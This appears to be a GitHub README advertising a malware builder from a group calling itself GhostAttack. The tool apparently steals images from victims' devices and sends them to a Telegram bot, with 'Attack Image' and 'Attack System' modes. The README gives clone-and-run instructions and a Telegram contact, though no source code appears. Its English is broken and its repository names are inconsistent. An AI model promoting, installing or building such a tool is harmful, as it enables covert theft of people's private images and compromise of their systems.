# Malware
Powered By [GhostAttack](https://Telegram.me/Black_Code_22) Team
Toole Dead Code get Image to send bot Telegram from skript and more ...

## Screenshot:
<img src="https://github.com/deadcode22/Hack-image/blob/main/1.jpg"> <img src="https://github.com/deadcode22/Hack-image/blob/main/2.jpg">
<img src="https://github.com/deadcode22/Hack-image/blob/main/3.jpg">

### Installation : 

` git clone https://github.com/deadcode22/Hake-image.git `

` cd Hake-image `

` python3 Building-Malware.py `

## Feature : 
> FAST AND EASY

> Get Full Image

> Get Skript from bot 

> fully Support 

> Good Design

## Used :  
> 1  == Attack Image 

> 2  == Attack System 

### Support Telegram Channel : [Telegram Dead Code](https://t.me/Black_Code_22)
